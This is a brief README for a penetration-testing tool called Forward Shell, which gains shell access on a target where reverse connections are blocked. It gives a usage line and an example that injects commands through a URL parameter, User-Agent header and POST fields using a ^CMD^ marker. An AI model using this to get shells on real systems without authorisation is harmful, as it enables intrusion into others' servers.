# Forward Shell

Forward Shell can be used to gain shell access in an enviorement which you cannot access back to your machine from target machine.  

## Usage

python3 forward_shell.py -u [URL] -H [HEADERS] -d [DATA] -i [INTERVAL]

to inject command, add "^CMD^" to any option. Example:

```bash
./forward_shell.py -u "http://example.com/index.php?cmd=^CMD^" -H "User-Agent: ^CMD^" -d "username=^CMD^&password=^CMD^" -i 5
```